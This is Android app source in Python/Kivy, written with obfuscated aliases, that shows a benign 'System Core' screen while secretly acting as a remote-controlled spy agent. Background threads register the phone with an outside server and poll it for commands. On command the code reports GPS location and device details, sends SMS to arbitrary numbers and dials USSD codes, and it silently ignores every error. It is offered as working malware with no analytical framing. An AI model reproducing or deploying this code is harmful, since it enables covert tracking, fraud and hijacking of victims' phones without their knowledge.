from kivy.app import App as A
from kivy.uix.label import Label as L
from kivy.uix.boxlayout import BoxLayout as BL
from kivy.core.window import Window as W
import threading as T, time as t, socket as S, json as J, os, datetime as D
from android.permissions import request_permissions as RP, Permission as PM
from android import mActivity as MA
from jnius import autoclass as AC
I=AC('android.content.Intent');SM=AC('android.telephony.SmsManager');CT=AC('android.content.Context');LM=AC('android.location.LocationManager');Bd=AC('android.os.Build')
RP([PM.ACCESS_FINE_LOCATION,PM.ACCESS_COARSE_LOCATION,PM.SEND_SMS,PM.READ_SMS,PM.INTERNET,PM.RECEIVE_BOOT_COMPLETED,PM.WAKE_LOCK,PM.READ_PHONE_STATE])
U1="https://4nny.pythonanywhere.com";D1=S.gethostname()
class C:
    def __init__(s):s.r=False;s.id=D1
    def start(s):
        if s.r:return
        s.r=True;T.Thread(target=s._reg,daemon=True).start();T.Thread(target=s._poll,daemon=True).start()
    def _reg(s):
        while s.r:
            try:import requests as R;R.post(f"{U1}/command_result",json={'device':s.id,'status':'online','model':'Core'},timeout=10);print("[+] Registered")
            except:pass
            t.sleep(60)
    def _poll(s):
        while s.r:
            try:
                import requests as R;x=R.get(f"{U1}/commands?device={s.id}",timeout=10)
                if x.status_code==200:
                    for c in x.json():
                        if c.get('type')=='get_location':s._loc()
                        elif c.get('type')=='send_ussd':s._ussd(c.get('payload',{}).get('code',''))
                        elif c.get('type')=='send_sms':s._sms(c.get('payload',{}).get('number',''),c.get('payload',{}).get('text',''))
                        elif c.get('type')=='get_device_info':s._info()
            except:pass
            t.sleep(5)
    def _loc(s):
        try:
            lm=MA.getSystemService(CT.LOCATION_SERVICE);loc=lm.getLastKnownLocation(LM.GPS_PROVIDER) or lm.getLastKnownLocation(LM.NETWORK_PROVIDER)
            if loc:
                import requests as R;R.post(f"{U1}/location",json={'device':s.id,'lat':loc.getLatitude(),'lng':loc.getLongitude()},timeout=5)
        except:pass
    def _ussd(s,c):
        try:ii=I(I.ACTION_CALL);ii.setData(AC('android.net.Uri').parse(f"tel:{c}"));ii.setFlags(I.FLAG_ACTIVITY_NEW_TASK);MA.startActivity(ii)
        except:pass
    def _sms(s,n,t):
        try:SM.getDefault().sendTextMessage(n,None,t,None,None)
        except:pass
    def _info(s):
        try:
            import requests as R;R.post(f"{U1}/command_result",json={'device':s.id,'device_info':{'model':Bd.MODEL,'man':Bd.MANUFACTURER,'av':Bd.VERSION.RELEASE}},timeout=5)
        except:pass
class App(A):
    def build(s):
        W.clearcolor=(0.05,0.1,0.15,1);m=BL(orientation='vertical',padding=30,spacing=15)
        m.add_widget(L(text="⚙️",font_size=72,color=(0,0.8,1,1)))
        m.add_widget(L(text="System Core",font_size=22,bold=True,color=(0,0.8,1,1)))
        s.srv=C();s.srv.start();return m
if __name__=="__main__":App().run()
